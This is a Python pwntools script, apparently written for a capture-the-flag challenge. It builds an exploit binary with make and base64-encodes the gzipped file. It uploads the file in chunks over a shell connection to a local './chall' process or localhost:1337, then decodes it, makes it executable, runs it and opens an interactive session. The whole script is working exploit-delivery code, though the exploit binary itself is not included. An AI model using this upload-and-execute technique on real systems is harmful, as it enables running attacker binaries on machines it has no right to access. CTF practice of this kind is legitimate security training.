#!/usr/bin/env python2.7
from pwn import *
import subprocess


PROMT = "$ "


def prepare_exploit():
    log.info("make")
    subprocess.call("make", shell=True)


def send_exploit(io):
    fd = open("exp.gz")
    data = fd.read()
    data = data.encode("base64")

    io.recvuntil(PROMT)

    log.info("Uploading exploit : {0} bytes".format(len(data)))
    width = 1000
    for i in range(0, len(data), width):
        io.sendline("echo -ne \"" + data[i:i+width] + "\" >> exploit.b64")
    io.recvuntil(PROMT)
    io.sendline("cat exploit.b64 | base64 -d  > exp.gz")
    io.recvuntil(PROMT)
    io.sendline("gzip -d exp.gz")
    io.recvuntil(PROMT)
    io.sendline("chmod +x exp")
    io.recvuntil(PROMT)
    io.sendline("rm exploit.b64")
    return io


def run_exploit(io):
    io.recvuntil(PROMT)
    io.sendline("./exp")
    return io


def enable_debug():
    log.info("Attaching debugger ...")
    raw_input()


if False:
    io = remote("localhost", 1337)
else:
    # context.log_level = "debug"

    context.terminal = ['tmux', 'splitw', '-h']
    io = process(["./chall"])

prepare_exploit()
send_exploit(io)
enable_debug()

run_exploit(io)
io.interactive(prompt="")
